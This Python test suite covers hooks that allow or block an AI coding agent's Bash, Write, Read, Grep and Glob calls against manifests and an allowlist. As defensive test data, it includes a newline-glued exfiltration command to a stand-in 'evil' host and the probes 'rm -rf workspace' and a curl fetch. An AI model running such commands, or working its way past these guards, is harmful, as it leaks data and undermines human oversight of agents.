    # way to strengthen the rule — not an instruction. Deliberately NARROW (the 40
    # characters immediately before the span): a marker anywhere on the line exempts
    # every other span on it, and on these surfaces every line carrying the tmp rule
    # also carries the bootstrap-Bash prohibition.
    # The verb forms matter: an earlier list held past participles only, so
    # `refuses` / `blocks` / `rejects` — the present tense every one of these
    # surfaces actually writes — marked nothing, and quoting the retired form
    # while describing it was rejected. Measured on this repository's own prose.
    _MARKS_AS_REFUSED = re.compile(
        r"(?:\bNG\b|\bnot\b|\bnever\b|forbidden|forbids?|"
        r"block(?:s|ed|ing)?|refus(?:e|es|ed|ing|al)|reject(?:s|ed|ing)?|"
        r"instead of)[^`]{0,40}$",
        re.IGNORECASE,
    )

    # In a fenced block the marker is a comment LINE above the command, and this
    # repository writes those comments at 80-90 characters, so the 40-character
    # window above cannot see them: measured, the NG example could not be written
    # in the block where docs/AGENT_CONTRACT.md keeps its other NG examples.
    _MARKS_AS_REFUSED_ANYWHERE = re.compile(
        r"\bNG\b|\bnever\b|forbidden|forbids?|block(?:s|ed|ing)?|"
        r"refus(?:e|es|ed|ing|al)|reject(?:s|ed|ing)?|instead of",
        re.IGNORECASE,
    )

    # A `Bash(...)` / `Read(...)` span is a permission-RULE spelling, not a command
    # anyone is being taught to run. Without this, the repository could not quote
    # the candidate allow entry that issue #77 exists to evaluate.
    _PERMISSION_ENTRY = re.compile(r"^(?:Bash|Read|Write|Edit|WebFetch)\(.*\)$")

    @classmethod
    def _redirect_offenders(cls, text: str, rel: str = "<fixture>") -> list[str]:
        """The rule, in one place, called by the surfaces check and by its self-test.

        A negative assertion is green when its detector is broken, and the detector
        is five parts, not one: the span scanner, the two marker vocabularies, the
        permission-entry exemption, and the redirect pattern. Reimplementing any of
        them in the self-test would leave the real one unobserved, so both callers
        run THIS function.
        """
        offenders: list[str] = []
        for n, span, is_fenced, intro in cls._command_spans(text):
            marked = (
                cls._MARKS_AS_REFUSED_ANYWHERE.search(intro)
                if is_fenced
                else cls._MARKS_AS_REFUSED.search(intro)
            )
            if marked:
                continue
            if cls._PERMISSION_ENTRY.match(span.strip()):
                continue
            for segment in re.split(r"\|\||&&|[;|]", span):
                if not cls._REDIRECT.search(segment):
                    continue
                # The command in front of the redirect is not consulted: no command
                # makes a redirect to a file a permitted route, so a bare idiom and
                # a line-continuation tail are offenders too (both were skipped
                # while the admission existed).
                offenders.append(f"{rel}:{n}: {segment.strip()}")
        return offenders

    @staticmethod
    def _command_spans(text: str) -> list[tuple[int, str, bool, str]]:
        """(line number, command text, is_fenced, the prose introducing it).

        The introducing prose is what decides whether a command is being TAUGHT or
        shown as refused, so it is captured per span, not per line: on these surfaces
        one line carries several spans, and the tmp paragraph always contains the word
        "blocked" somewhere (the bootstrap-Bash prohibition), which would exempt the
        whole line — measured, that left both prompt templates unguarded.
        """
        spans: list[tuple[int, str, bool, str]] = []
        lines = text.splitlines()
        fenced = False
        for n, line in enumerate(lines, start=1):
            if line.lstrip().startswith(("```", "~~~")):
                fenced = not fenced
                continue
            if fenced:
                # Six lines, not two: a fenced NG block whose comment header runs
                # to three lines (the length this repository writes) had its marker
                # outside the window, so writing the rule as an NG example failed.
                spans.append((n, line, True, "\n".join(lines[max(0, n - 6) : n - 1])))
                continue
            for m in re.finditer(r"`([^`]+)`", line):
                spans.append(
                    (n, m.group(1), False, line[max(0, m.start() - 120) : m.start()])
                )
        return spans

    def test_tmpdir_env_form_is_not_a_write_path(self) -> None:
        """PIN: `${TMPDIR}/x` is not the scratch route; only the literal path is.

        docs/workflow/LAUNCH_PROMPT_REFERENCE.md states this as a measured mechanism
        claim, and the branch's other mechanism claims went unpinned. The guard
        compares the path it is handed against allowed_tmp_root verbatim; the Write
        tool takes a path, not a shell word, so nothing expands the variable.
        """
        for spelling in ("${TMPDIR}/work.py", "$TMPDIR/work.py"):
            with self.subTest(spelling=spelling), tempfile.TemporaryDirectory() as tmp:
                repo_root = Path(tmp)
                orch = "orch_tmpdir_env_001"
                run_id = "step_run_tmpdir_env_001"
                self._setup_orchestration_for_write(
                    repo_root,
                    orch=orch,
                    run_id=run_id,
                    allowed_output_paths=["workspace/ir/p/spec.ir.yaml"],
                    allowed_file_tool_paths=["workspace/ir/p/spec.ir.yaml"],
                    allowed_tmp_root=f"workspace/tmp/{run_id}",
                )
                code, body = self._invoke_write_hook(
                    orch=orch, repo_root=repo_root, file_path=spelling
                )
                self.assertEqual(code, 2, f"{spelling} must not be write-eligible")
                self.assertEqual(body.get("decision"), "block")

    def test_instruction_surfaces_teach_no_redirect_into_the_tmp_root(
        self,
    ) -> None:
        """SAMPLE (not a pin): no instruction surface shows a redirect into the tmp
        root, in any position.

        The rule, not a spelling: the permission layer refuses a Bash redirect to a
        file, so there is no position in which one is a route a leaf can take. An
        earlier version of this check admitted a redirect APPENDED to a command the
        committed allowlist covers, on the premise that it rides that entry. That
        premise was measured false on Claude Code 2.1.234 — both taught captures
        (`... 2>workspace/tmp/<arid>/e.txt` on the allowlisted run-gate command, and a
        stdout capture on the allowlisted `python3 workspace/tmp/*` route) answer
        `Output redirection to '<path>' was blocked`, while the same commands without
        the redirect run. The admission is therefore gone rather than narrowed, and
        the check is strictly stricter than the version it replaces; `docs/HOOKS.md`
        §"Layer boundary" carries the measurement.

        SCOPE, stated because three versions of this check were each defeated in a
        new form. It answers ONE question: does a documented command carry a redirect
        into the tmp root that the permission layer would refuse? It does NOT answer
        "does this document teach shell-authored scratch files", which is not decidable
        from text — `python3 gen.py > work.py` and `cat tpl > work.py` are permitted
        commands that also author a scratch file, and both are admitted here. That
        second question has no static instrument in this branch; it is what review of
        a documentation change is for.

        Further declared limits, each measured: it reads an enumerated file list; it
        only sees commands inside backticks, a fenced block (``` or ~~~), so a route
        taught in bare prose or a 4-space-indented block is invisible; a span split
        across two backtick runs is invisible; and a span introduced by an explicit
        refusal marker in the 40 characters before it is skipped, so the rule can be
        shown as an NG example.
        """
        repo_root = Path(__file__).resolve().parents[2]
        # The scanned set is asserted, not merely iterated: emptying it, or dropping
        # the file this rule change added, makes every negative assertion below
        # vacuous while staying green.
        self.assertEqual(
            set(self._REDIRECT_SURFACES),
            {rel for rel, _anchor, _scope in self._SCRATCH_SURFACES}
            | {"docs/CLI_REFERENCE.md"},
        )
        for rel in self._REDIRECT_SURFACES:
            with self.subTest(surface=rel):
                path = repo_root / rel
                self.assertTrue(path.is_file(), f"{rel} missing; update the surface list")
                offenders = self._redirect_offenders(
                    path.read_text(encoding="utf-8"), rel
                )
                self.assertEqual(offenders, [], "\n".join(offenders))

    def test_redirect_detector_sees_every_taught_shape_and_not_the_exempt_ones(
        self,
    ) -> None:
        """SELF-TEST for the check above, which is a negative assertion.

        A negative assertion is green when its detector is broken, and this detector
        has five parts: the span scanner, the two marker vocabularies, the
        permission-entry exemption, and the redirect pattern. Measured: emptying
        `_command_spans`, blanking either marker regex, or replacing the offender
        accumulation with `pass` all left the surfaces check green while it read the
        real tree. So the fixtures below drive `_redirect_offenders` — the same
        function the surfaces check calls — instead of reimplementing the loop.

        The two former "admitted" cases are here as DETECTED shapes: after the
        measurement, an appended capture is refused exactly as a standalone redirect
        is. `/dev/null` and a path outside the tmp root must NOT be seen — the first
        discards rather than writes, the second is a different rule's subject.
        """
        detected = (
            "cat > workspace/tmp/a/x.py <<'EOF'",
            "printf 'x' > workspace/tmp/a/x.py",
            "tee workspace/tmp/a/x.py",
            "python3 tools/new_agent_run_id.py > workspace/tmp/a/id.txt",
            "python3 tools/orchestration_runtime.py run-gate --gate g 2>workspace/tmp/a/e.txt",
            "cat workspace/tmp/a/in.txt 2>workspace/tmp/a/err.txt",
            "python3 workspace/tmp/a/x.py > workspace/tmp/a/out.txt",
            "python3 tools/orchestration_runtime.py run-gate --gate g >>workspace/tmp/a/e.txt",
        )
        not_detected = (
            "python3 tools/orchestration_runtime.py run-gate --gate g 2>/dev/null",
            "python3 workspace/tmp/a/x.py",
            "python3 gen.py > docs/out.txt",
        )
        for command in detected:
            with self.subTest(command=command, expect="detected"):
                self.assertIsNotNone(
                    self._REDIRECT.search(command),
                    "the detector saw no redirect into the tmp root",
                )
        for command in not_detected:
            with self.subTest(command=command, expect="not detected"):
                self.assertIsNone(self._REDIRECT.search(command))

    def test_redirect_offender_rule_flags_and_admits_on_fixtures(self) -> None:
        """SELF-TEST of the whole rule, on fixture documents rather than the tree.

        Each case names the part it observes. Without these, four ways of making the
        surfaces check vacuous were green: `_command_spans` returning `[]`, either
        marker regex reduced to `r""`, and the offender append replaced by `pass`.

        The admitted cases are equally load-bearing: they are the over-refusal
        probes. `refuses` / `blocks` / `rejects` are the verbs these surfaces write,
        a permission entry is a rule spelling rather than a command, and a fenced NG
        block carries its marker in a comment header several lines up.
        """
        flagged = {
            "bare prose": "Capture it with `2>workspace/tmp/<agent_run_id>/e.txt` for later.",
            "appended to a permitted command": (
                "Run `python3 tools/orchestration_runtime.py run-gate --gate g "
                "2>workspace/tmp/<agent_run_id>/e.txt` to keep the result."
            ),
            "tee": "Keep a copy with `run-gate --gate g | tee workspace/tmp/a/e.txt`.",
            "fenced, no marker": "```bash\nrun-gate --gate g 2>workspace/tmp/a/e.txt\n```",
            "marker AFTER the span": "The form `2>workspace/tmp/a/e.txt` is refused.",
        }
        for label, text in flagged.items():
            with self.subTest(case=label, expect="flagged"):
                self.assertEqual(
                    len(self._redirect_offenders(text)), 1, f"{label}: not flagged"
                )
        admitted = {
            "refuses": "The layer refuses `2>workspace/tmp/a/e.txt`.",
            "blocks": "The layer blocks `2>workspace/tmp/a/e.txt`.",
            "rejects": "The layer rejects `2>workspace/tmp/a/e.txt`.",
            "refused": "The layer refused `2>workspace/tmp/a/e.txt`.",
            "not, before the span": "This is not a route: `2>workspace/tmp/a/e.txt`.",
            "permission entry": "Add `Bash(python3 tools/orchestration_runtime.py * 2>workspace/tmp/*)`.",
            "devnull": "Discard it with `run-gate --gate g 2>/dev/null`.",
            "outside the tmp root": "Write it with `python3 gen.py > docs/out.txt`.",
            "fenced NG block, three-line header": (
                "```bash\n# NG: the permission layer refuses this shape;\n"
                "# the gate result is read from the command result instead,\n"
                "# so nothing needs to be captured to a file.\n"
                "run-gate --gate g 2>workspace/tmp/a/e.txt\n```"
            ),
        }
        for label, text in admitted.items():
            with self.subTest(case=label, expect="admitted"):
                self.assertEqual(
                    self._redirect_offenders(text), [], f"{label}: wrongly flagged"
                )

    @staticmethod
    def _allowlisted_bash_matchers(repo_root: Path) -> list[re.Pattern[str]]:
        """The Bash commands `.claude/settings.json` permits, read from the file.

        A `*` is a wildcard wherever it appears, not only at the end: an earlier
        version stripped a trailing `*` and prefix-matched the rest, which made
        `Bash(jq -er * workspace/tmp/*)` unmatchable.
        """
        settings = json.loads(
            (repo_root / ".claude" / "settings.json").read_text(encoding="utf-8")
        )
        matchers = []
        for entry in settings["permissions"]["allow"]:
            if not entry.startswith("Bash(") or not entry.endswith(")"):
                continue
            pattern = entry[len("Bash(") : -1]
            if pattern.endswith(" *"):
                # A trailing ` *` also permits the command with NO argument at all:
                # measured on CLI 2.1.234, `python3 tools/validate_workspace_root.py`
                # runs under `Bash(python3 tools/validate_workspace_root.py *)`, and
                # the gate runbook emits exactly that argument-less form. Requiring
                # the separator refused a command the layer allows.
                head = "".join(
                    ".*" if part == "*" else re.escape(part)
                    for part in re.split(r"(\*)", pattern[: -len(" *")])
                )
                matchers.append(re.compile(head + r"(?:\s.*)?$"))
                continue
            body = "".join(
                ".*" if part == "*" else re.escape(part)
                for part in re.split(r"(\*)", pattern)
            )
            # An entry with no wildcard is an EXACT match, not a prefix.
            matchers.append(re.compile(body if "*" in pattern else body + r"\s*$"))
        return matchers

    def test_committed_allowlist_covers_the_commands_the_repository_instructs(
        self,
    ) -> None:
        """PIN: every command a leaf is TOLD to run is matched by a committed entry.

        Since PR #72 the committed `.claude/settings.json` is an agentic leaf's whole
        permission layer, so an entry deleted or misspelled costs every leaf an
        interactive approval that cannot be answered — the workflow stalls. Nothing
        read that file after the redirect admission was removed: measured, stripping
        all ten `Bash(...)` entries left the entire suite green.

        The commands are taken from the RENDERED gate runbook rather than restated
        here, so a new gate command is covered the day it is emitted. The scratch
        route is the second instructed command and is spelled from the contract.

        SCOPE: this asks whether the entries cover what the repository instructs. It
        does not ask whether they are minimal, and it cannot see a command a leaf
        invents. The negative probe is what keeps it from being vacuous — a matcher
        list that matched everything would satisfy the positives alone.
        """
        import re as _re

        from tools.orchestration_runtime import (
            ALLOWED_VALIDATE_PIPELINE_STAGES,
            _build_gate_runbook,
        )

        repo_root = Path(__file__).resolve().parents[2]
        matchers = self._allowlisted_bash_matchers(repo_root)
        self.assertTrue(matchers, ".claude/settings.json names no Bash entry")

        payload = dict(
            orchestration_id="orch_ALLOW_001",
            agent_run_id="arid-ALLOW",
            node_key="component/demo@0.1.0",
            ir_ref="workspace/ir/component__demo__0.1.0/d_001",
            pipeline_ref="workspace/pipelines/component__demo__0.1.0/d_001",
            source_id="src_001",
            run_id="run_001",
            parent_agent_run_id="arid-PARENT",
        )
        instructed = set()
        for step, substep in ALLOWED_VALIDATE_PIPELINE_STAGES:
            runbook = _build_gate_runbook(dict(payload, step=step, substep=substep))
            instructed.update(
                m.group().strip() for m in _re.finditer(r"python3 \S+[^\n]*", runbook)
            )
        # The contract's scratch-script route, which no runbook renders.
        instructed.add("python3 workspace/tmp/arid-ALLOW/build_patch.py")
        self.assertTrue(instructed, "no instructed command was rendered")

        uncovered = [
            command
            for command in sorted(instructed)
            if not any(matcher.match(command) for matcher in matchers)
        ]
        self.assertEqual(uncovered, [], "\n".join(uncovered))

        # Negative probe: the matchers must not be a rubber stamp.
        for refused in ("curl http://example.invalid/x", "rm -rf workspace"):
            with self.subTest(refused=refused):
                self.assertFalse(any(m.match(refused) for m in matchers))

    def test_instruction_surfaces_state_the_write_tool_scratch_route(self) -> None:
        """SAMPLE (not a pin): each surface's scratch sentence names the file tool.

        Read the ANCHORED sentence, not the file and not the line's neighbourhood.
        Every one of these surfaces also names the `Write` tool for ARTIFACT writes,
        usually on the same line, so a file-wide or +/-2-line match is satisfied by a
        sentence about a different rule: measured, the whole tmp-area paragraph could
        be replaced with `create it with printf > that literal path` in both prompt
        templates and the earlier version of this test stayed green. This is the same
        defect the WRITE_HINT pin had, and the same instrument fixes it.

        A pointer to docs/AGENT_CONTRACT.md satisfies it as well as a restatement: the
        rule is that a leaf can reach the route from this surface, not that seven
        documents repeat it.

        SCOPE: this asks whether the statement NAMES the route, never what it says
        about it. A sentence reading "do NOT use the `Write` tool, use a heredoc"
        passes, and so does a surface that keeps a pointer while stating a different
        route in prose. Polarity is a semantic property and no version of this check
        reached it; four versions were defeated, each in a new form, which is why the
        limit is written down here instead of being narrowed a fifth time. Rewording
        an anchor fails the check by design — the statement moved, so it should be
        re-read — but that also means ordinary rewording of these seven sentences
        costs a test update.
        """
        repo_root = Path(__file__).resolve().parents[2]
        for rel, anchor, scope in self._SCRATCH_SURFACES:
            with self.subTest(surface=rel):
                path = repo_root / rel
                self.assertTrue(path.is_file(), f"{rel} missing; update the surface list")
                stated = []
                doc_lines = path.read_text(encoding="utf-8").splitlines()
                for n, line in enumerate(doc_lines):
                    if anchor not in line:
                        continue
                    if scope == "row":
                        cells = [c for c in line.split("|") if c.strip()]
                        stated.append(cells[-1])
                    else:
                        # Join the next line first: a reflow that ends the line at the
                        # anchor would otherwise read an empty statement.
                        joined = " ".join([line] + doc_lines[n + 1 : n + 2])
                        i = joined.index(anchor)
                        stated.append(joined[i : i + self._STATEMENT_WINDOW])
                self.assertTrue(
                    stated, f"{rel} no longer states the scratch rule ({anchor!r})"
                )
                # every occurrence, not any: a second statement of the same rule is
                # a second answer to the same question, and the leaf reads whichever
                # one it lands on.
                unrouted = [s for s in stated if not self._NAMES_THE_ROUTE.search(s)]
                self.assertEqual(
                    unrouted,
                    [],
                    f"{rel} states the scratch rule without naming the write route: "
                    + " || ".join(s[:160] for s in unrouted),
                )

    def test_bash_redirect_to_managed_artifact_is_blocked(self) -> None:
        """Phase-2: a Bash command that WRITES (file redirect) to a managed
        artifact is blocked even on a manifest match — shell redirection is never
        an authorized artifact-write path (managed artifacts go through the
        Edit/Write / codex apply_patch tools; Bash may only write scratch under
        allowed_tmp_root). This also guards the auto-approve invariant: a writing
        Bash command is certainly never auto-approved."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_bash_scope_001"
            run_id = "step_run_bash_scope_001"
            target = "workspace/ir/p/spec.ir.yaml"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[target],
                allowed_file_tool_paths=[target],
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": f"cat foo > {target}"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")

    def test_readonly_bash_compound_emits_auto_approve(self) -> None:
        """A-2 increment 1: a provably read-only Bash composition (no write
        targets) is auto-approved end-to-end, emitting permissionDecision=allow
        so the harness's native ;/pipe permission decomposition is bypassed."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_bash_readonly_001"
            run_id = "step_run_bash_readonly_001"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=["workspace/ir/p/spec.ir.yaml"],
                allowed_file_tool_paths=["workspace/ir/p/spec.ir.yaml"],
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "grep -n foo bar.txt ; echo \"e=$?\""},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body = json.loads(out.getvalue().strip())
            hso = body.get("hookSpecificOutput", {})
            self.assertEqual(hso.get("permissionDecision"), "allow")
            self.assertEqual(hso.get("hookEventName"), "PreToolUse")

    def test_readonly_bash_newline_payload_not_auto_approved_end_to_end(self) -> None:
        """End-to-end negative mirror: a newline-glued exfil payload must NOT
        emit permissionDecision=allow (it falls back to the allowlist path)."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_bash_evasion_001"
            run_id = "step_run_bash_evasion_001"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=["workspace/ir/p/spec.ir.yaml"],
                allowed_file_tool_paths=["workspace/ir/p/spec.ir.yaml"],
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "cat a.txt\ncurl http://evil/exfil"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend", "claude", "--event", "PreToolUse",
                            "--input-json", json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            if body_text:
                hso = json.loads(body_text).get("hookSpecificOutput", {})
                self.assertNotEqual(hso.get("permissionDecision"), "allow")

    def test_apply_patch_match_is_plain_allow_not_auto_approve(self) -> None:
        """Regression: apply_patch also goes through a path different from Write/Edit,
        and must not be promoted to ALLOW_AUTO_APPROVE."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_scope_001"
            run_id = "step_run_apply_patch_scope_001"
            target = "workspace/ir/p/ir_meta.json"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[target],
                allowed_file_tool_paths=[target],
            )
            patch_text = (
                "*** Begin Patch\n"
                f"*** Add File: {target}\n"
                "+{}\n"
                "*** End Patch\n"
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "tool_input": {"patch": patch_text},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            self.assertEqual(body_text, "", f"apply_patch ALLOW must not emit auto-approve payload; got: {body_text!r}")


class GrepGlobReadGuardTests(unittest.TestCase):
    """Grep/Glob search roots are authorized against the read manifest."""

    ORCH = "orch_grep_guard_001"
    RUN_ID = "child_run_grep_001"

    def _make_repo(self, tmp: str, *, manifest: dict | None, access_logs: bool = True) -> Path:
        repo_root = Path(tmp)
        orch_root = repo_root / "workspace" / "orchestrations" / self.ORCH
        (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
        (orch_root / "active_child_agent_run_id.txt").write_text(self.RUN_ID, encoding="utf-8")
        if manifest is not None:
            (orch_root / "read_manifests" / f"{self.RUN_ID}.json").write_text(
                json.dumps(manifest), encoding="utf-8"
            )
        if access_logs:
            (orch_root / "access_logs").mkdir(parents=True, exist_ok=True)
        (repo_root / "docs").mkdir(parents=True, exist_ok=True)
        return repo_root

    def _run(self, repo_root: Path, tool_name: str, tool_input: dict, *, workflow_mode: str = "1"):
        payload = {
            "orchestration_id": self.ORCH,
            "repo_root": str(repo_root),
            "tool_name": tool_name,
            "tool_input": tool_input,
        }
        out = io.StringIO()
        with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": workflow_mode}, clear=False):
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
        return code, out.getvalue().strip()

    def _log_lines(self, repo_root: Path) -> list[dict]:
        log_path = (
            repo_root
            / "workspace"
            / "orchestrations"
            / self.ORCH
            / "access_logs"
            / f"{self.RUN_ID}.jsonl"
        )
        if not log_path.is_file():
            return []
        return [
            json.loads(line)
            for line in log_path.read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]

    def test_settings_json_registers_grep_and_glob_with_bash_first(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        settings_doc = json.loads(
            (repo_root / ".claude" / "settings.json").read_text(encoding="utf-8")
        )
        entries = settings_doc["hooks"]["PreToolUse"]
        matchers = [entry["matcher"] for entry in entries]
        # Other tests index PreToolUse[0] for the Bash hook command.
        self.assertEqual(matchers[0], "Bash")
        self.assertEqual(matchers, ["Bash", "Write", "Edit", "Read", "Grep", "Glob"])
        bash_command = entries[0]["hooks"][0]["command"]
        for entry in entries:
            self.assertEqual(entry["hooks"][0]["command"], bash_command)

    def test_path_under_allowed_root_allows_and_logs(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            code, body = self._run(repo_root, "Grep", {"pattern": "foo", "path": "docs/sub"})
            self.assertEqual(code, 0)
            lines = self._log_lines(repo_root)
            self.assertEqual(len(lines), 1)
            self.assertEqual(lines[0]["decision"], "allow")
            self.assertEqual(lines[0]["tool"], "Grep")
            self.assertEqual(lines[0]["source"], "hook")
            self.assertEqual(lines[0]["path"], "docs/sub")

    def test_path_equal_to_allowed_root_allows(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            code, _ = self._run(repo_root, "Glob", {"pattern": "*.md", "path": "docs"})
            self.assertEqual(code, 0)

    def test_path_outside_allowed_roots_blocks_and_logs(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            code, body = self._run(repo_root, "Grep", {"pattern": "foo", "path": "tools"})
            self.assertEqual(code, 2)
            doc = json.loads(body)
            self.assertEqual(doc.get("decision"), "block")
            self.assertIn("unauthorized read", doc.get("reason", ""))
            lines = self._log_lines(repo_root)
            self.assertEqual(len(lines), 1)
            self.assertEqual(lines[0]["decision"], "block")
            self.assertEqual(lines[0]["policy"], "read_manifest_read_guard")

    def test_missing_path_blocks_with_remediation(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            for tool_name in ("Grep", "Glob"):
                code, body = self._run(repo_root, tool_name, {"pattern": "foo"})
                self.assertEqual(code, 2, msg=tool_name)
                reason = json.loads(body).get("reason", "")
                self.assertIn("unauthorized read", reason)
                self.assertIn("without a 'path'", reason)
                self.assertIn("allowed_read_roots", reason)

    def test_repo_root_manifest_root_allows_pathless_search(self) -> None:
        """A manifest that really grants the repo root is not second-guessed."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["."]})
            code, _ = self._run(repo_root, "Grep", {"pattern": "foo"})
            self.assertEqual(code, 0)

    def test_non_workflow_mode_allows_without_logging(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            code, _ = self._run(
                repo_root, "Grep", {"pattern": "foo", "path": "tools"}, workflow_mode="0"
            )
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_missing_manifest_blocks_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest=None)
            code, body = self._run(repo_root, "Glob", {"pattern": "*.md", "path": "docs"})
            self.assertEqual(code, 2)
            self.assertIn("read manifest not found", json.loads(body).get("reason", ""))

    def test_unresolvable_agent_run_id_blocks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            (
                repo_root
                / "workspace"
                / "orchestrations"
                / self.ORCH
                / "active_child_agent_run_id.txt"
            ).write_text("   ", encoding="utf-8")
            code, body = self._run(repo_root, "Grep", {"pattern": "foo", "path": "docs"})
            self.assertEqual(code, 2)
            reason = json.loads(body).get("reason", "")
            self.assertIn("active child agent_run_id is empty", reason)
            # A blocked SEARCH must not be handed the Edit/Write remediation.
            self.assertIn("allowed_read_roots", reason)
            self.assertNotIn("allowed_file_tool_paths", reason)

    def test_missing_access_log_dir_does_not_change_decision(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(
                tmp, manifest={"allowed_read_roots": ["docs/"]}, access_logs=False
            )
            code, _ = self._run(repo_root, "Grep", {"pattern": "foo", "path": "docs"})
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])


class BashReadManifestGuardTests(unittest.TestCase):
    """Bash read targets are authorized before the read-only auto-approve."""

    ORCH = "orch_bash_read_001"
    RUN_ID = "child_run_bash_read_001"

    def _make_repo(self, tmp: str, *, roots: list[str] | None) -> Path:
        repo_root = Path(tmp)
        orch_root = repo_root / "workspace" / "orchestrations" / self.ORCH
        (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
        (orch_root / "access_logs").mkdir(parents=True, exist_ok=True)
        (orch_root / "active_child_agent_run_id.txt").write_text(self.RUN_ID, encoding="utf-8")
        if roots is not None:
            (orch_root / "read_manifests" / f"{self.RUN_ID}.json").write_text(
                json.dumps({"allowed_read_roots": roots}), encoding="utf-8"
            )
        (repo_root / "docs").mkdir(parents=True, exist_ok=True)
        (repo_root / "docs" / "WORKFLOW.md").write_text("x", encoding="utf-8")
        # NOT under tools/: forbid_tools_direct_read would fire first and
        # this suite is about the read-manifest guard.
        (repo_root / "spec").mkdir(parents=True, exist_ok=True)
        (repo_root / "spec" / "private.md").write_text("x", encoding="utf-8")
        return repo_root

    def _run(self, repo_root: Path, command: str, *, workflow_mode: str = "1"):
        payload = {
            "orchestration_id": self.ORCH,
            "repo_root": str(repo_root),
            "tool_name": "Bash",
            "tool_input": {"command": command},
        }
        out = io.StringIO()
        with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": workflow_mode}, clear=False):
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
        return code, out.getvalue().strip()

    def _log_lines(self, repo_root: Path) -> list[dict]:
        log_path = (
            repo_root
            / "workspace"
            / "orchestrations"
            / self.ORCH
            / "access_logs"
            / f"{self.RUN_ID}.jsonl"
        )
        if not log_path.is_file():
            return []
        return [
            json.loads(line)
            for line in log_path.read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]

    def test_out_of_manifest_read_blocks_an_otherwise_auto_approvable_command(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "true && cat spec/private.md")
            self.assertEqual(code, 2)
            doc = json.loads(body)
            self.assertEqual(doc.get("decision"), "block")
            reason = doc.get("reason", "")
            self.assertIn("unauthorized read", reason)
            self.assertIn("Bash command reads 'spec/private.md'", reason)
            self.assertIn("allowed_read_roots", reason)
            lines = self._log_lines(repo_root)
            self.assertEqual(len(lines), 1)
            self.assertEqual(lines[0]["decision"], "block")
            self.assertEqual(lines[0]["tool"], "Bash")
